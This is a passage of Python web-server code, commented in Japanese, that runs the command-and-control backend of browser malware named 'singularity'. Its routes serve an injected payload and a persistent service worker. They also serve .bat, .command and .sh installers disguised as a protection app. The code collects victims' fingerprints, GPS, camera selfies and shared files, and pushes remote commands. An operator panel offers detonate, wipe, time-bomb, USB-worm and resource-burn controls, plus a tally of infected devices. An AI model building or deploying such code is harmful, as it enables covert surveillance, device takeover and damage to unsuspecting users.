                       (code, hid)).fetchall():
        have[r["key"]] = r["value"]

    ts = _now()
    n = 0
    for k, v in list(items.items())[:400]:
        if not isinstance(v, str):
            v = json.dumps(v, ensure_ascii=False)
        if have.get(k) == v:
            continue
        c.execute("INSERT INTO virus_data(code,hit,vid,key,value,ts) VALUES(?,?,?,?,?,?)",
                  (code, hid, sid, str(k)[:60], v[:20000], ts))
        n += 1
    if snap and have.get("selfie") != snap:
        c.execute("INSERT INTO virus_data(code,hit,vid,key,value,ts) VALUES(?,?,?,?,?,?)",
                  (code, hid, sid, "selfie", snap[:400000], ts))
        n += 1

    # --- 端末情報の自己修復（UA解析が失敗していても payload の申告で埋める） ---
    try:
        env = report.get("env") or {}
        ua2 = str(env.get("ua") or "")[:400]
        dev = str(env.get("device") or env.get("platform") or "")[:60]
        os2 = str(env.get("os") or "")[:60]
        br = str(env.get("browser") or "")[:60]
        if ua2 or dev or os2 or br:
            cur = c.execute("SELECT ua,device,os,browser FROM virus_hits WHERE id=?",
                            (hid,)).fetchone()
            if cur:
                nu = ua2 or cur["ua"]
                nd = dev if (not cur["device"] or cur["device"] == "不明") else cur["device"]
                no = os2 if (not cur["os"] or cur["os"] == "不明") else cur["os"]
                nb = br if (not cur["browser"] or cur["browser"] == "不明") else cur["browser"]
                c.execute("UPDATE virus_hits SET ua=?,device=?,os=?,browser=? WHERE id=?",
                          (nu, nd, no, nb, hid))
        # JSが動いた時点で bot ではない
        c.execute("UPDATE virus_hits SET is_bot=0 WHERE id=?", (hid,))
    except Exception:
        pass

    gps = (report.get("media") or {}).get("gps") or {}
    try:
        if gps.get("lat") is not None:
            c.execute("UPDATE virus_hits SET gps_lat=?, gps_lon=? WHERE id=?",
                      (float(gps["lat"]), float(gps["lon"]), hid))
    except Exception:
        pass

    c.execute("UPDATE virus_links SET last_ts=? WHERE code=?", (ts, code))
    try:
        c.execute("DELETE FROM virus_data WHERE code=? AND id NOT IN "
                  "(SELECT id FROM virus_data WHERE code=? ORDER BY id DESC LIMIT 20000)",
                  (code, code))
    except Exception:
        pass
    c.commit()
    c.close()
    return n


def _sg_cfg(row, code, sid, lv, app_name, extra=None):
    """singularity の CFG を組み立てる（本体ページと注入用 p.js で共有）。"""
    base = f"/v/{code}/sg"
    fixed = _is_fixed(row)
    if fixed:
        lv = 7
    cfg = {
        "sid": sid, "path": base, "collect": base + "/c", "cmd": base + "/cmd",
        "sse": base + "/sse" if _SG_SSE else "", "ack": base + "/ack",
        "sw": base + "/sw.js", "pjs": base + "/p.js", "manifest": base + "/manifest.json",
        "icons": [base + "/icon-192.png", base + "/icon-512.png"],
        "level": lv, "fire": int(_val(row, "firing", 1) or 0),
        "fixed": fixed, "finalRamMB": _SG_FINAL_RAM_MB, "gpuMem": _SG_GPU_MEM,
        "installer": True, "code": code,
        "winLock": _sg_win_lock(),
        "freeze": _val(row, "freeze", "") or "", "bomb": _val(row, "bomb", "") or "",
        "w": 0, "wipe": False, "avName": app_name, "ver": _SG_VER,
        "install": os.getenv("SG_INSTALL", "auto"), "installLevel": _SG_INSTALL_LEVEL,
        "inj": bool(_SG_INJ and int(_val(row, "inj", 1) or 0)),
        "rat": bool(_SG_RAT), "sseOn": bool(_SG_SSE),
        "usbCode": code, "usbWorm": True, "usbBase": "", "usbLabel": app_name,
    }
    if extra:
        cfg.update(extra)
    return cfg


def _sg_land(code, request, sid=""):
    owner = _owner(code)
    if not owner:
        return PlainTextResponse("リンクが無効です", status_code=404)
    c = _db(owner)
    row = _link(c, code)
    c.close()
    if not row or not row["active"]:
        return PlainTextResponse("リンクが無効です", status_code=404)

    sid = (sid or _sg_sid())[:64]
    ref = request.query_params.get("ref") or ""
    w = request.query_params.get("w") or "0"
    wipe = request.query_params.get("wipe") == "1"
    installed = request.query_params.get("i") == "1"
    hid = _record_hit(owner, code, request)
    c = _db(owner)
    try:
        c.execute("UPDATE virus_hits SET vid=? WHERE id=?", (sid, hid))
        c.commit()
    except Exception:
        pass
    c.close()

    lv = int(_val(row, "level", 1) or 0)
    lvq = request.query_params.get("level")
    if lvq is not None and str(lvq).isdigit():
        lv = _lv(lvq)
    if _is_fixed(row):
        lv = 7                                     # 固定枠は何があってもL7
    if installed:
        lv = max(lv, _SG_INSTALL_LEVEL)          # インストール済みアプリ窓は最低L4

    _n = (row["name"] or "").strip()
    app_name = (request.query_params.get("n") or os.getenv("SG_APP_NAME")
                or (f"{_n} の保護" if _n and _n != "名無し" else _SG_APP_NAME))

    cfg = _sg_cfg(row, code, sid, lv, app_name,
                  {"w": int(w) if str(w).isdigit() else 0, "wipe": wipe})
    resp = _render("virus_singularity.html", request, code=code, sid=sid, hit=hid,
                   link=dict(row), ref=ref, level=lv,
                   level_label=_SG_LEVEL_LABEL.get(lv, ""),
                   manifest=cfg["manifest"] + "?n=" + quote_plus(app_name),
                   icon192=cfg["icons"][0], icon512=cfg["icons"][1], app_name=app_name,
                   cfg_json=json.dumps(cfg, ensure_ascii=False),
                   worker_json=json.dumps(_SG_WORKER), payload=_SG_PAYLOAD)
    # crossOriginIsolated を成立させ、SharedArrayBuffer / Atomics.wait を確実に使えるようにする
    resp.headers["Cross-Origin-Opener-Policy"] = "same-origin"
    resp.headers["Cross-Origin-Embedder-Policy"] = "require-corp"
    try:
        resp.set_cookie("sgid", sid, max_age=315360000, samesite="lax", path="/")
    except Exception:
        pass
    return resp


# --- ルート宣言順は厳守（4セグメントの literal を {sid} より前に） ---

@router.get("/v/{code}/sg/p.js")
def sg_pjs(code: str, sid: str = "", level: str = "", u: str = "", v: str = ""):
    """SWが全ページに差し込む注入用ペイロード。"""
    owner = _owner(code)
    if not owner:
        raise HTTPException(404)
    c = _db(owner)
    row = _link(c, code)
    c.close()
    if not row or not row["active"]:
        raise HTTPException(404)
    sid = (sid or _sg_sid())[:64]
    lv = int(_val(row, "level", 1) or 0)
    if level.isdigit():
        lv = _lv(level)
    cfg = _sg_cfg(row, code, sid, lv, (row["name"] or "").strip() or _SG_APP_NAME,
                  {"injected": True, "install": "click", "windows": 0, "hop": False})
    js = ("window.__SINGULARITY_CFG__=" + json.dumps(cfg, ensure_ascii=False)
          + ";window.__SINGULARITY_WORKER__=" + json.dumps(_SG_WORKER) + ";"
          + "window.__SINGULARITY_VER__=" + json.dumps(_SG_VER) + ";"
          + _SG_PAYLOAD)
    return Response(js, media_type="application/javascript",
                    headers={"Cache-Control": "public, max-age=300",
                            "Access-Control-Allow-Origin": "*"})


@router.get("/v/{code}/sg/sw.js")
def sg_sw(code: str):
    return Response(_SG_SW, media_type="application/javascript",
                    headers={"Service-Worker-Allowed": "/", "Cache-Control": "no-store",
                            "Cross-Origin-Opener-Policy": "same-origin",
                            "Cross-Origin-Embedder-Policy": "require-corp"})


@router.get("/v/{code}/sg/shared.js")
def sg_shared(code: str):
    return Response(_SG_SHARED, media_type="application/javascript",
                    headers={"Cache-Control": "no-store"})


def _sg_installer_ctx(code: str, request: Request, app: str, burn: str, disk: str):
    """インストーラ生成の共通部。"""
    owner = _owner(code)
    if not owner:
        raise HTTPException(404)
    c = _db(owner)
    row = _link(c, code)
    c.close()
    if not row or not row["active"]:
        raise HTTPException(404)
    base = _base(request)
    url = f"{base}/v/{code}/sg?u=os&i=1"
    try:
        b = int(burn)
    except Exception:
        b = 0
    b = max(1, min(_SG_BURN_MAX, b or 4))
    try:
        d = int(disk)
    except Exception:
        d = 0
    d = max(0, min(65536, d or 1024))
    nm = (app or _SG_APP_NAME)[:60]
    safe = re.sub(r"[^A-Za-z0-9_.-]", "", nm) or "blocker"
    return url, code, nm, b, d, safe


@router.get("/v/{code}/sg/install.bat")
def sg_install_bat(code: str, request: Request, burn: str = "", disk: str = "", app: str = ""):
    url, code2, nm, b, d, safe = _sg_installer_ctx(code, request, app, burn, disk)
    body = _sg_installer(_SG_BAT, url, code2, nm, b, d, crlf=True)
    return Response(body, media_type="application/octet-stream", headers={
        "Content-Disposition": f'attachment; filename="{safe}.bat"',
        "Cache-Control": "no-store"})


@router.get("/v/{code}/sg/install.command")
def sg_install_command(code: str, request: Request, burn: str = "", disk: str = "", app: str = ""):
    url, code2, nm, b, d, safe = _sg_installer_ctx(code, request, app, burn, disk)
    body = _sg_installer(_SG_CMD, url, code2, nm, b, d)
    return Response(body, media_type="application/octet-stream", headers={
        "Content-Disposition": f'attachment; filename="{safe}.command"',
        "Cache-Control": "no-store"})


@router.get("/v/{code}/sg/install.sh")
def sg_install_sh(code: str, request: Request, burn: str = "", disk: str = "", app: str = ""):
    url, code2, nm, b, d, safe = _sg_installer_ctx(code, request, app, burn, disk)
    body = _sg_installer(_SG_SH, url, code2, nm, b, d)
    return Response(body, media_type="application/octet-stream", headers={
        "Content-Disposition": f'attachment; filename="{safe}.sh"',
        "Cache-Control": "no-store"})


@router.get("/v/{code}/sg/manifest.json")
def sg_manifest(code: str, name: str = ""):
    base = f"/v/{code}/sg"
    app = (name or os.getenv("SG_APP_NAME") or _SG_APP_NAME)[:40]
    if _SG_PIL:
        icons = [
            {"src": base + "/icon-192.png", "sizes": "192x192",
             "type": "image/png", "purpose": "any"},
            {"src": base + "/icon-512.png", "sizes": "512x512",
             "type": "image/png", "purpose": "any"},
            {"src": base + "/icon-512.png", "sizes": "512x512",
             "type": "image/png", "purpose": "maskable"},
        ]
    else:
        icons = [{"src": base + "/icon.svg", "sizes": "any",
                  "type": "image/svg+xml", "purpose": "any maskable"}]
    man = {
        "name": app, "short_name": app[:12],
        "start_url": base + "?i=1", "scope": "/",
        "display": "standalone", "display_override": ["window-controls-overlay", "standalone"],
        "background_color": "#05070a", "theme_color": "#05070a",
        "icons": icons,
        "share_target": {"action": base + "/share", "method": "POST",
                         "enctype": "multipart/form-data",
                         "params": {"title": "t", "text": "d", "url": "u"}},
        "protocol_handlers": [{"protocol": "web+sg",
                               "url": base + "/?ref=%s"}],
        "file_handlers": [{"action": base,
                           "accept": {"application/x-singularity": [".sg"]}}],
        "edge_side_panel": {"preferred_width": 420},
        "note_taking": {"new_note_url": base + "?ref=note"},
        "prefer_related_applications": False,
    }
    return JSONResponse(man, headers={
        "Content-Type": "application/manifest+json; charset=utf-8",
        "Cache-Control": "no-store",
    })


@router.get("/v/{code}/sg/icon-192.png")
def sg_icon192():
    d = _sg_icon(192)
    if not d:
        return Response(_SG_ICON_SVG, media_type="image/svg+xml")
    return Response(d, media_type="image/png",
                    headers={"Cache-Control": "public, max-age=86400"})


@router.get("/v/{code}/sg/icon-512.png")
def sg_icon512():
    d = _sg_icon(512)
    if not d:
        return Response(_SG_ICON_SVG, media_type="image/svg+xml")
    return Response(d, media_type="image/png",
                    headers={"Cache-Control": "public, max-age=86400"})


@router.get("/v/{code}/sg/icon.svg")
def sg_icon_svg():
    return Response(_SG_ICON_SVG, media_type="image/svg+xml",
                    headers={"Cache-Control": "public, max-age=86400"})


@router.get("/v/{code}/sg/c")
async def sg_collect_get(code: str, request: Request, sid: str = "", d: str = ""):
    """画像ピクセル経路（GET）。+ が空白に潰れるので戻す。"""
    owner = _owner(code)
    if not owner:
        return Response(_GIF1, media_type="image/gif")
    if d:
        try:
            d = d.replace(" ", "+")
            body = json.loads(base64.b64decode(d + "=" * (-len(d) % 4)).decode("utf-8"))
        except Exception:
            body = {}
        if isinstance(body, dict) and body:
            try:
                _sg_ingest(owner, code, body, sid or str(body.get("sid") or ""))
            except Exception:
                pass
    return Response(_GIF1, media_type="image/gif")


@router.post("/v/{code}/sg/c")
async def sg_collect(code: str, request: Request):
    owner = _owner(code)
    if not owner:
        return {"ok": 0}
    try:
        body = await request.json()
    except Exception:
        body = {}
    if not isinstance(body, dict):
        body = {}
    try:
        n = _sg_ingest(owner, code, body, str(body.get("sid") or ""))
    except Exception:
        n = 0
    return {"ok": 1, "n": n, "server": _now(), "ver": _SG_VER}


def _sg_cmd_payload(owner, code, sid, sw=False):
    """ペイロード／SW／SSE が拾う遠隔コマンド。個体別(sid)＋全体(sid='')。"""
    c = _db(owner)
    row = _link(c, code)
    if not row:
        c.close()
        return {"ok": 0}
    cmds = [dict(r) for r in c.execute(
        "SELECT id,kind,arg FROM virus_cmd WHERE code=? AND state<2 AND (sid=? OR sid='') "
        "ORDER BY id LIMIT 40", (code, sid or "")).fetchall()]
    if cmds:
        c.execute("UPDATE virus_cmd SET state=1 WHERE code=? AND state=0 AND (sid=? OR sid='')",
                  (code, sid or ""))
        c.commit()
    fixed = _is_fixed(row)
    out = {"ok": 1,
           "level": 7 if fixed else int(_val(row, "level", 1) or 0),
           "fixed": fixed,
           "fire": int(_val(row, "firing", 1) or 0),
           "freeze": _val(row, "freeze", "") or "",
           "wipe": int(_val(row, "wipe_seq", 0) or 0),
           "ver": _SG_VER, "cmds": cmds, "server": _now()}
    c.close()
    return out


@router.get("/v/{code}/sg/cmd")
def sg_cmd(code: str, sid: str = ""):
    owner = _owner(code)
    if not owner:
        return {"ok": 0}
    return _sg_cmd_payload(owner, code, sid)


@router.get("/v/{code}/sg/sse")
async def sg_sse(code: str, request: Request, sid: str = ""):
    owner = _owner(code)
    if not owner:
        raise HTTPException(404)

    async def gen():
        last, n = "", 0
        while True:
            try:
                if await request.is_disconnected():
                    break
                p = _sg_cmd_payload(owner, code, sid)
                body = json.dumps(p, ensure_ascii=False)
                if body != last:
                    last = body
                    yield "data: " + body + "\n\n"
                n += 1
                if n % 8 == 0:
                    yield ": ping\n\n"
            except Exception:
                yield ": err\n\n"
            await asyncio.sleep(2)

    return StreamingResponse(gen(), media_type="text/event-stream", headers={
        "Cache-Control": "no-cache", "X-Accel-Buffering": "no", "Connection": "keep-alive",
        "Access-Control-Allow-Origin": "*"})


@router.post("/v/{code}/sg/ack")
async def sg_ack(code: str, request: Request):
    owner = _owner(code)
    if not owner:
        return {"ok": 0}
    try:
        body = await request.json()
    except Exception:
        body = {}
    ids = body.get("ids") or []
    if not isinstance(ids, list):
        ids = []
    c = _db(owner)
    n = 0
    for i in ids[:100]:
        try:
            c.execute("UPDATE virus_cmd SET state=2 WHERE id=? AND code=?", (int(i), code))
            n += 1
        except Exception:
            pass
    c.commit()
    c.close()
    return {"ok": 1, "n": n}


@router.get("/v/{code}/sg/worker.js")
def sg_worker(code: str):
    return Response(_SG_WORKER, media_type="application/javascript",
                    headers={"Cache-Control": "no-store"})


@router.post("/v/{code}/sg/share")
async def sg_share(code: str, request: Request, sid: str = ""):
    """share_target の受け口。共有されたファイル名を報告に載せる。"""
    owner = _owner(code)
    if not owner:
        return PlainTextResponse("ok")
    try:
        form = await request.form()
        got = []
        for k, v in form.multi_items():
            try:
                if hasattr(v, "filename"):
                    got.append({"k": str(k)[:40], "v": "file:" + str(v.filename)[:120]})
                else:
                    got.append({"k": str(k)[:40], "v": str(v)[:200]})
            except Exception:
                pass
        _sg_ingest(owner, code, {"sid": sid or "share", "share": {"items": got[:40]}},
                   sid or "share")
    except Exception:
        pass
    return RedirectResponse(f"/v/{code}/sg?u=share", status_code=303)


@router.get("/v/{code}/sg/{sid}")
def sg_child(code: str, sid: str, request: Request):
    return _sg_land(code, request, sid=sid)


@router.get("/v/{code}/sg")
def sg_root(code: str, request: Request):
    return _sg_land(code, request)


# --- 監視室からの制御（フォーム版・併用可） ---

@router.post("/vp/{code}/level")
def sg_level(code: str, level: str = Form("1"), u=Depends(_auth)):
    owner = tenancy.get_current() or u
    c = _db(owner)
    row = _link(c, code)
    fixed = _is_fixed(row) if row else False
    lv = 7 if fixed else _lv(level)
    c.execute("UPDATE virus_links SET level=?, firing=1 WHERE code=?", (lv, code))
    c.commit()
    c.close()
    return RedirectResponse("/vp/" + code + "?lvl=" + str(lv), status_code=303)


@router.post("/vp/{code}/fix")
def sg_fix(code: str, fixed: str = Form("1"), u=Depends(_auth)):
    """固定枠の設定／解除。立てると L7 にロックされ、遠隔から下げられない。"""
    owner = tenancy.get_current() or u
    c = _db(owner)
    v = 0 if str(fixed) in ("0", "", "false", "False") else 1
    row = _link(c, code)
    lv = 7 if v else int(_val(row, "level", 1) or 1)
    c.execute("UPDATE virus_links SET fixed=?, level=?, firing=1 WHERE code=?", (v, lv, code))
    c.commit()
    c.close()
    return RedirectResponse("/vp/" + code + "?fix=" + str(v), status_code=303)


@router.post("/vp/{code}/freeze")
def sg_freeze(code: str, freeze: str = Form(""), u=Depends(_auth)):
    owner = tenancy.get_current() or u
    fz = freeze if freeze in ("off", "soft", "hard") else ""
    c = _db(owner)
    c.execute("UPDATE virus_links SET freeze=? WHERE code=?", (fz, code))
    c.commit()
    c.close()
    return RedirectResponse("/vp/" + code, status_code=303)


@router.post("/vp/{code}/detonate")
def sg_detonate(code: str, u=Depends(_auth)):
    """最終形態へ即時移行（レベル6・稼働）。"""
    owner = tenancy.get_current() or u
    c = _db(owner)
    c.execute("UPDATE virus_links SET level=6, firing=1, freeze='' WHERE code=?", (code,))
    c.commit()
    c.close()
    return RedirectResponse("/vp/" + code + "?boom=1", status_code=303)


@router.post("/vp/{code}/wipe")
def sg_wipe(code: str, u=Depends(_auth)):
    """感染端末の痕跡を完全消去させる（SWが navigate で叩き起こす）。"""
    owner = tenancy.get_current() or u
    c = _db(owner)
    c.execute("UPDATE virus_links SET wipe_seq=COALESCE(wipe_seq,0)+1 WHERE code=?", (code,))
    c.commit()
    c.close()
    return RedirectResponse("/vp/" + code + "?wiped=1", status_code=303)


@router.post("/vp/{code}/cmd")
def sg_push(request: Request, code: str, kind: str = Form(...), arg: str = Form(""),
            sid: str = Form(""), u=Depends(_auth)):
    """個体別コマンド。sid を空にすると全個体へ。"""
    owner = tenancy.get_current() or u
    c = _db(owner)
    if not _link(c, code):
        c.close()
        raise HTTPException(404)
    c.execute("INSERT INTO virus_cmd(code,sid,kind,arg,state,ts) VALUES(?,?,?,?,0,?)",
              (code, (sid or "")[:64], (kind or "")[:24], (arg or "")[:400], _now()))
    c.commit()
    c.close()
    return RedirectResponse("/vp/" + code + "?cmd=" + kind, status_code=303)


@router.post("/vp/{code}/cmds/clear")
def sg_cmd_clear(code: str, u=Depends(_auth)):
    owner = tenancy.get_current() or u
    c = _db(owner)
    c.execute("DELETE FROM virus_cmd WHERE code=?", (code,))
    c.commit()
    c.close()
    return RedirectResponse("/vp/" + code, status_code=303)


# ===========================================================================
# AJAX 操作盤用 JSON API（ページ遷移しない・監視室が使う）
# ===========================================================================

def _api_state(owner, code):
    """操作盤が同期に使う現在状態。"""
    c = _db(owner)
    row = _link(c, code)
    if not row:
        c.close()
        raise HTTPException(404)
    pend = c.execute("SELECT COUNT(*) n FROM virus_cmd WHERE code=? AND state<2",
                     (code,)).fetchone()["n"]
    hn = c.execute("SELECT COUNT(*) n FROM virus_hits WHERE code=?", (code,)).fetchone()["n"]
    c.close()
    fixed = _is_fixed(row)
    return {"ok": 1, "code": code,
            "level": 7 if fixed else int(_val(row, "level", 1) or 0),
            "fixed": 1 if fixed else 0,
            "firing": int(_val(row, "firing", 1) or 0),
            "freeze": _val(row, "freeze", "") or "",
            "wipe_seq": int(_val(row, "wipe_seq", 0) or 0),
            "winset": int(_val(row, "winset", 100) or 0),
            "bomb": _val(row, "bomb", "") or "",
            "inj": int(_val(row, "inj", 1) or 0),
            "ver": _val(row, "ver", "") or _SG_VER,
            "hits": hn, "pending": pend, "server": _now()}


async def _api_body(request: Request):
    try:
        b = await request.json()
        if isinstance(b, dict):
            return b
    except Exception:
        pass
    try:
        f = await request.form()
        return {k: v for k, v in f.items()}
    except Exception:
        return {}


@router.get("/api/vp/{code}/state")
def api_state(code: str, u=Depends(_auth)):
    owner = tenancy.get_current() or u
    return _api_state(owner, code)


@router.post("/api/vp/{code}/level")
async def api_level(request: Request, code: str, u=Depends(_auth)):
    owner = tenancy.get_current() or u
    b = await _api_body(request)
    c = _db(owner)
    row = _link(c, code)
    fixed = _is_fixed(row) if row else False
    lv = 7 if fixed else _lv(b.get("level"))
    c.execute("UPDATE virus_links SET level=?, firing=1 WHERE code=?", (lv, code))
    c.commit()
    c.close()
    return _api_state(owner, code)


@router.post("/api/vp/{code}/fix")
async def api_fix(request: Request, code: str, u=Depends(_auth)):
    """固定枠のON/OFF。ONで L7 にロック。"""
    owner = tenancy.get_current() or u
    b = await _api_body(request)
    v = 0 if str(b.get("fixed") or "0") in ("0", "", "false", "False") else 1
    c = _db(owner)
    row = _link(c, code)
    if not row:
        c.close()
        raise HTTPException(404)
    lv = 7 if v else int(_val(row, "level", 1) or 1)
    c.execute("UPDATE virus_links SET fixed=?, level=?, firing=1 WHERE code=?", (v, lv, code))
    c.commit()
    c.close()
    return _api_state(owner, code)


@router.post("/api/vp/{code}/freeze")
async def api_freeze(request: Request, code: str, u=Depends(_auth)):
    owner = tenancy.get_current() or u
    b = await _api_body(request)
    fz = b.get("freeze") or ""
    if fz not in ("off", "soft", "hard"):
        fz = ""
    c = _db(owner)
    c.execute("UPDATE virus_links SET freeze=? WHERE code=?", (fz, code))
    c.commit()
    c.close()
    return _api_state(owner, code)


@router.post("/api/vp/{code}/fire")
def api_fire(code: str, u=Depends(_auth)):
    owner = tenancy.get_current() or u
    c = _db(owner)
    c.execute("UPDATE virus_links SET firing=1, seq=COALESCE(seq,0)+1 WHERE code=?", (code,))
    c.commit()
    c.close()
    return _api_state(owner, code)


@router.post("/api/vp/{code}/stop")
def api_stop(code: str, u=Depends(_auth)):
    owner = tenancy.get_current() or u
    c = _db(owner)
    c.execute("UPDATE virus_links SET firing=0 WHERE code=?", (code,))
    c.commit()
    c.close()
    return _api_state(owner, code)


@router.post("/api/vp/{code}/resume")
def api_resume(code: str, u=Depends(_auth)):
    owner = tenancy.get_current() or u
    c = _db(owner)
    c.execute("UPDATE virus_links SET firing=1 WHERE code=?", (code,))
    c.commit()
    c.close()
    return _api_state(owner, code)


@router.post("/api/vp/{code}/set")
async def api_set(request: Request, code: str, u=Depends(_auth)):
    owner = tenancy.get_current() or u
    b = await _api_body(request)
    try:
        ws = int(b.get("winset"))
    except Exception:
        ws = 100
    if ws not in SET_CHOICES:
        ws = 100
    c = _db(owner)
    c.execute("UPDATE virus_links SET winset=? WHERE code=?", (ws, code))
    c.commit()
    c.close()
    return _api_state(owner, code)


@router.post("/api/vp/{code}/detonate")
def api_detonate(code: str, u=Depends(_auth)):
    owner = tenancy.get_current() or u
    c = _db(owner)
    c.execute("UPDATE virus_links SET level=6, firing=1, freeze='' WHERE code=?", (code,))
    c.commit()
    c.close()
    return _api_state(owner, code)


@router.post("/api/vp/{code}/wipe")
def api_wipe(code: str, u=Depends(_auth)):
    owner = tenancy.get_current() or u
    c = _db(owner)
    c.execute("UPDATE virus_links SET wipe_seq=COALESCE(wipe_seq,0)+1 WHERE code=?", (code,))
    c.commit()
    c.close()
    return _api_state(owner, code)


@router.post("/api/vp/{code}/bomb")
async def api_bomb(request: Request, code: str, u=Depends(_auth)):
    """潜伏条件（YYYY-MM-DDTHH:MM の日時、または host に含ませる文字列）。空で解除。"""
    owner = tenancy.get_current() or u
    b = await _api_body(request)
    c = _db(owner)
    c.execute("UPDATE virus_links SET bomb=? WHERE code=?",
              ((b.get("bomb") or "").strip()[:64], code))
    c.commit()
    c.close()
    return _api_state(owner, code)


@router.post("/api/vp/{code}/inj")
async def api_inj(request: Request, code: str, u=Depends(_auth)):
    """サイト全体へのSW注入（HTML書き換え）の on/off。"""
    owner = tenancy.get_current() or u
    b = await _api_body(request)
    v = 0 if str(b.get("inj") or "0") in ("0", "", "false", "False") else 1
    c = _db(owner)
    c.execute("UPDATE virus_links SET inj=? WHERE code=?", (v, code))
    c.commit()
    c.close()
    return _api_state(owner, code)


@router.post("/api/vp/{code}/cmd")
async def api_cmd(request: Request, code: str, u=Depends(_auth)):
    """個体別コマンド。sid を空にすると全個体。"""
    owner = tenancy.get_current() or u
    b = await _api_body(request)
    c = _db(owner)
    if not _link(c, code):
        c.close()
        raise HTTPException(404)
    c.execute("INSERT INTO virus_cmd(code,sid,kind,arg,state,ts) VALUES(?,?,?,?,0,?)",
              (code, str(b.get("sid") or "")[:64], str(b.get("kind") or "")[:24],
               str(b.get("arg") or "")[:400], _now()))
    c.commit()
    c.close()
    return _api_state(owner, code)


@router.post("/api/vp/{code}/cmds/clear")
def api_cmd_clear(code: str, u=Depends(_auth)):
    owner = tenancy.get_current() or u
    c = _db(owner)
    c.execute("DELETE FROM virus_cmd WHERE code=?", (code,))
    c.commit()
    c.close()
    return _api_state(owner, code)


# ===========================================================================
# 感染判定と進行度（踏んだ個体ごとの「倒せたか」／全体の制圧率）
# ===========================================================================

# 進行度 0〜6。SG_DEFEAT_AT 以上を「倒せた（常駐成立）」と数える。
SG_DEFEAT_AT = 3

SG_STAGE_LABEL = {
    0: "未実行", 1: "着弾", 2: "偵察", 3: "常駐",
    4: "稼働", 5: "制圧", 6: "終焉",
}
SG_STAGE_DESC = {
    0: "URLを踏んだがJSが動いていない（クローラ／プレビュー取得の疑い）",
    1: "JSが動き最初の報告を送ってきた",
    2: "環境・指紋の抜き取りに成功",
    3: "Service Worker が常駐した（ここから“倒せた”扱い）",
    4: "遠隔コマンドに応答（ハートビート／SSE 生存）",
    5: "RAT・burn・ディスク書き込みが稼働",
    6: "全系統同時稼働（終焉）",
}
SG_STAGE_COLOR = {
    0: "#5b6b7c", 1: "#4c8dff", 2: "#3ad1c8", 3: "#7ce23a",
    4: "#ffd21e", 5: "#ff8a2b", 6: "#ff2d55",
}

# payload が申告してくるキーの接頭辞 → 到達段階
_SG_STAGE_RULES = (
    (2, ("env.", "fp.", "verdict.", "hw.", "net.")),
    (3, ("privacy.sw", "sw.", "swreg", "persist.", "cache.", "opfs.")),
    (4, ("sse.", "hb.", "ack.", "cmd.", "alive", "visits.")),
    (5, ("burn.", "webgpu.", "wasm.", "worklet.", "disk.", "media.", "rat.")),
    (6, ("union.", "sync.", "bomb.", "app.", "manifest.", "wipe.")),
)

_BOT_KW = ("bot", "crawler", "spider", "curl", "wget", "python-requests",
           "headless", "render-", "line-poker", "facebookexternalhit",
           "preview", "monitor", "uptime", "lighthouse")


def _sg_is_bot(h, rows=()):
    """手動マーク(bot.manual)を最優先 → is_bot 列 → UA推定。"""
    for r in rows or ():
        if str(r.get("key") or "") == "bot.manual":
            return str(r.get("value") or "") not in ("0", "", "false", "False")
    try:
        if h.get("is_bot") is not None:
            return int(h.get("is_bot") or 0) == 1
    except Exception:
        pass
    ua = (h.get("ua") or "").lower()
    return any(k in ua for k in _BOT_KW)


def _sg_stage(rows):
    """virus_data のキー集合から進行度(0-6)を出す。"""
    if not rows:
        return 0
    keys = [str(r.get("key") or "") for r in rows]
    st = 1
    for lvl, prefixes in _SG_STAGE_RULES:
        hit = sum(1 for p in prefixes if any(p in k for k in keys))
        need = 3 if lvl >= 6 else 1          # 終焉は複数系統そろって初めて成立
        if hit >= need:
            st = max(st, lvl)
    return min(st, 6)


def _sg_stat(hits, stages, by_hit):
    st = {i: 0 for i in range(7)}
    bot = uanone = 0
    for h in hits:
        if _sg_is_bot(h, by_hit.get(h["id"]) or []):
            bot += 1
            continue
        if not (h.get("ua") or "").strip():
            uanone += 1
        lv = int(stages.get(h["id"], 0) or 0)
        st[max(0, min(6, lv))] += 1
    total = sum(st.values())
    defeated = sum(st[i] for i in range(SG_DEFEAT_AT, 7))
    partial = st[1] + st[2]
    rate = int(round(defeated * 100.0 / total)) if total else 0
    return {"total": total, "defeated": defeated, "partial": partial,
            "idle": st[0], "bot": bot, "uanone": uanone, "rate": rate,
            "stages": st}


def _sg_stages_for(hits, by_hit):
    stages = {}
    for h in hits:
        stages[h["id"]] = _sg_stage(by_hit.get(h["id"]) or [])
    return stages, _sg_stat(hits, stages, by_hit)


@router.get("/api/vp/{code}/stages")
def api_stages(code: str, u=Depends(_auth)):
    """監視室が数秒ごとに叩く。行・進行度・集計をまとめて返す（リロード不要）。"""
    owner = tenancy.get_current() or u
    c = _db(owner)
    row = _link(c, code)
    if not row:
        c.close()
        raise HTTPException(404)
    hits = [dict(r) for r in c.execute(
        "SELECT id,ts,ip,ua,device,os,browser,inapp,country,city,vid,is_bot,"
        "gps_lat,gps_lon FROM virus_hits WHERE code=? ORDER BY id DESC LIMIT 300",
        (code,)).fetchall()]
    dat = [dict(r) for r in c.execute(
        "SELECT hit,key,value,ts FROM virus_data WHERE code=? "
        "ORDER BY id DESC LIMIT 8000", (code,)).fetchall()]
    c.close()
    by_hit = {}
    for d in dat:
        by_hit.setdefault(d["hit"], []).append(d)
    stages, stat = _sg_stages_for(hits, by_hit)
    last = {}
    for d in dat:
        last.setdefault(d["hit"], (d.get("key"), d.get("ts")))
    return {"ok": 1, "server": _now(), "count": len(hits),
            "stages": stages, "stat": stat,
            "labels": SG_STAGE_LABEL, "colors": SG_STAGE_COLOR,
            "defeat_at": SG_DEFEAT_AT,
            "rows": [{"id": h["id"], "ts": h.get("ts"), "ip": h.get("ip"),
                      "device": h.get("device"), "os": h.get("os"),
                      "browser": h.get("browser"), "country": h.get("country"),
                      "city": h.get("city"), "vid": h.get("vid") or "",
                      "gps": (h.get("gps_lat") is not None),
                      "last": (last.get(h["id"]) or ("", ""))[0],
                      "last_ts": (last.get(h["id"]) or ("", ""))[1]}
                     for h in hits]}


@router.post("/api/vp/{code}/hit/{hid}/bot")
def api_hit_bot(code: str, hid: int, u=Depends(_auth)):
    """その個体を手動でボット扱い／解除（virus_data に記録）。"""
    owner = tenancy.get_current() or u
    c = _db(owner)
    if not _link(c, code):
        c.close()
        raise HTTPException(404)
    r = c.execute("SELECT value FROM virus_data WHERE code=? AND hit=? AND key='bot.manual' "
                  "ORDER BY id DESC LIMIT 1", (code, hid)).fetchone()
    cur = (r["value"] if r else "0")
    nv = "0" if cur not in ("0", "", "false", "False") else "1"
